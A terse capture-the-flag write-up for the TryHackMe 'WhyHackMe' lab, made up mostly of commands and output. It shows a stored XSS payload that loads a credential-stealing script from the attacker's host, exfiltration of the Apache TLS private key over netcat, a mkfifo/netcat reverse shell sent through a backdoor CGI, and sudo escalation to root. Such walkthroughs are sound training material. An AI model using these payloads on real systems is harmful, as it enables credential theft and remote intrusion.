Link: https://tryhackme.com/room/whyhackme

<h1>Service Enumeration</h1>

<code>
<b>┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]
└─$ nmap -sV -sC -Pn 10.10.134.235</b>
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-08 02:28 CST
Nmap scan report for 10.10.134.235
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.30.202
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.16 seconds</p>
</code>
<b>┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]<br>
└─$ ftp anonymous@10.10.134.235</b><BR>
<code>
Connected to 10.10.134.235.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||46512|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> get update.txt
local: update.txt remote: update.txt
229 Entering Extended Passive Mode (|||46740|)
150 Opening BINARY mode data connection for update.txt (318 bytes).
100% |**********************************************************************************************************************************************************************************************|   318      169.79 KiB/s    00:00 ETA
226 Transfer complete.
318 bytes received in 00:00 (7.83 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||29466|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||59532|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> exit
421 Timeout.

<B>┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]<br>
└─$ cat update.txt  </B>

>Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 

┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.134.235 -x .php,.ht
>===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.134.235
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,tx
[+] Timeout:                 10s
===============================================================
2024/01/08 03:00:12 Starting gobuster in directory enumeration mode
===============================================================
/blog.php             (Status: 200) [Size: 3102]
/login.php            (Status: 200) [Size: 523] 
/register.php         (Status: 200) [Size: 643] 
/index.php            (Status: 200) [Size: 563] 
/dir                  (Status: 403) [Size: 278] 
/assets               (Status: 301) [Size: 315] [--> http://10.10.134.235/assets/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]                     
/config.php           (Status: 200) [Size: 0]                                     
/server-status        (Status: 403) [Size: 278] 

<h1> Web Service Testing </h1>

Trying found some XSS or LFI on POST request and found that register.php is vuln via parametr username
register new user: <script src="http://10.X.X.X:8000/stealer.js"></script>     // attacker ip
login by user
run python http server with stealer.js
call script by adding comments on blog page

log from http server
10.10.240.147 - - [11/Jan/2024 03:53:19] "GET /stealer4.js?jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -

<h2> PrivEscalation lateral moving </h2>

get access via ssh as jack run linpeas and get this

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                            
Matching Defaults entries for jack on ubuntu:                                                               
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
--remote-debugging-port
jack@ubuntu:/opt$ ls
capture.pcap  urgent.txt

<h2>Analysing Captured file</h2>

you need TLS key for decryption 
jack@ubuntu:/opt$ nc -w 3 10.x.x.x 4444 < ../etc/apache2/certs/apache.key 
import to wireshark Edit > Preferences > Protocols > TLS

GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id HTTP/1.1
Host: 10.0.2.15:41312
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1

HTTP/1.1 200 OK
Date: Wed, 16 Aug 2023 14:35:43 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 64
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html


uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)

<h2>Open Backdoor Port</h2>

jack@ubuntu:/opt$ sudo /usr/sbin/iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
jack@ubuntu:/opt$ ss -tlnup | grep "41312"
tcp   LISTEN 0      511               0.0.0.0:41312        0.0.0.0:*        

<h3>Get Reverse Shell</h3>

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.x.x.x 4444 >/tmp/f
url encode

https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.x.x.x%204444%20%3E%2Ftmp%2Ff


nc -lvnp 4444

<h2>PrivEsc</h2>

www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
www-data@ubuntu:/usr/lib/cgi-bin$ sudo su
sudo su
/usr/bin/script -qc /bin/bash /dev/null
root@ubuntu:/usr/lib/cgi-bin# id
id
uid=0(root) gid=0(root) groups=0(root)

</code>


